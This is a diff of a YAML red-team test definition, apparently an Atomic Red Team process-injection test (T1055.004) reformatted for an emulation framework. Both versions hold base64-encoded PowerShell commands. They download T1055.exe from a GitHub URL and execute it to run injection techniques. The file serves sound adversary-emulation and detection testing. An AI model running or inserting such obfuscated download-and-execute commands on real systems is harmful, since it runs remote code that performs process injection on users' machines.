@@ -1,4 +1,4 @@
-- id: 80ecc513-512d-557c-bf08-a8b33fb09f14
+- requirements: []
   name: Soumaia ART Tests - Process Injection via C#
   description: 'Process Injection using C#
 
@@ -18,17 +18,15 @@
 
     Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.'
   tactic: stealth
-  technique:
-    attack_id: T1055.004
-    name: 'Process Injection: Asynchronous Procedure Call'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUANQAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADUALgBlAHgAZQAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAANQA1AC4AMAAwADQALwBiAGkAbgAvAFQAMQAwADUANQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAA1ADUALgBlAHgAZQAiAAoA
-          )
-          ".\T1055.exe"
-        payloads:
-        - T1055.exe
+  technique_id: T1055.004
+  technique_name: 'Process Injection: Asynchronous Procedure Call'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - T1055.exe
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUANQAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA= & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADUALgBlAHgAZQAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAANQA1AC4AMAAwADQALwBiAGkAbgAvAFQAMQAwADUANQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAA1ADUALgBlAHgAZQAiAAoA ) & ".\T1055.exe"
+  id: 80ecc513-512d-557c-bf08-a8b33fb09f14
